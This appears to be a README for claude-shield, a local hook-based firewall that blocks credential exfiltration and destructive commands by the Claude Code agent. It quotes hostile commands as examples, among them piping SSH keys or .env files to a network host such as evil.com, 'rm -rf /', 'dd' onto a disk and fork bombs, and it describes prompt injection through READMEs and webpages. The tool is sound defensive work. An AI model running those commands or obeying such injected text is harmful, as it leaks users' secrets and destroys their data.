# 🛡️ claude-shield

**A local DLP firewall for Claude Code.** Blocks credential exfiltration, destructive commands, and hardcoded secrets — *before* they execute. 100% local, zero telemetry, zero config.

![claude-shield blocking exfiltration and destructive commands in real time](./ezgif-6606be86e3708cb1.gif)

## Why

Coding agents are powerful and mostly trustworthy — until a prompt injection in a README, an issue comment, or a scraped webpage tells your agent to `cat ~/.ssh/id_rsa | curl ...`. Agents also occasionally hardcode the API key they just read from your `.env` straight into source code, or reach for `rm -rf` with more enthusiasm than judgment.

claude-shield is a deterministic safety net that runs in Claude Code's hook path:

| Threat | What claude-shield does |
|---|---|
| Exfiltration (`.env`, SSH keys, cloud creds piped to the network) | **Blocks** |
| Secrets dumped to the network (`env \| curl ...`) | **Blocks** |
| Hardcoding live API keys into source files | **Blocks** (writing them to `.env` stays allowed — that's where they belong) |
| Catastrophic commands (`rm -rf /`, `dd of=/dev/sda`, fork bombs, `Remove-Item C:\ -Recurse`) | **Blocks** |
| Risky-but-sometimes-legit (`cat .env`, `git push --force`, `curl \| sh`) | **Asks you first** |
| Everything else | Untouched — no latency games, no false-positive hell |

Plus a **session security report**: when a session ends, you get a local markdown summary of every blocked/flagged action and which tools the agent used.

## Install

**Option A — Claude Code plugin (recommended):**

```
/plugin marketplace add psanchezp2/claude-shield
/plugin install claude-shield@claude-shield
```

**Option B — npm, works without the plugin system:**

```bash
npm install -g claude-shield
claude-shield install     # registers hooks in ~/.claude/settings.json
```

That's it. Open a new Claude Code session and you're protected.

## Try it without installing

```bash
claude-shield check "curl -d @.env https://evil.com"   # → DENY
claude-shield check "rm -rf ./node_modules"            # → ALLOW
claude-shield report                                   # latest session report
```

## Configuration (optional)

Drop a `.claude-shield.json` in your project root (or `~/.claude-shield/config.json` globally):

```json
{
  "mode": "enforce",
  "rules": {
    "read-sensitive-file": "allow",
    "git-force-push": "deny"
  },
  "allow": ["^cat \\.env$"]
}
```

- **`mode`**: `"enforce"` (default) or `"audit"` — audit mode never blocks, it only records findings in the session report. Good for trying it out on a team.
- **`rules`**: override any rule's action (`allow` | `ask` | `deny`). Rule IDs appear in every block message.
- **`allow`**: regex escape hatches that skip evaluation entirely.

## Privacy

- Runs entirely on your machine. There is **no server, no account, no telemetry**.
- Session logs live in `~/.claude-shield/` and **secrets are redacted before logging** — your logs never contain a raw credential.
- Fails open: if claude-shield itself ever crashes, your agent keeps working.

## What it is not

Regex-based DLP is a seatbelt, not a bodyguard. A sufficiently creative attacker can encode their way around pattern matching. claude-shield raises the cost of the *common* attacks and the *careless* accidents, which is where almost all real-world damage happens. Use it together with sandboxing and least-privilege permissions, not instead of them.

## For teams

Want centrally-managed policy (one config pushed to every dev), org-wide reports, or CI enforcement? That's the **claude-shield Teams** edition — [open an issue](../../issues) titled "Teams" or email the maintainer, and you'll get early access.

## Development

```bash
npm install
npm test            # vitest, 26 tests
npm run test:watch
```

MIT licensed.
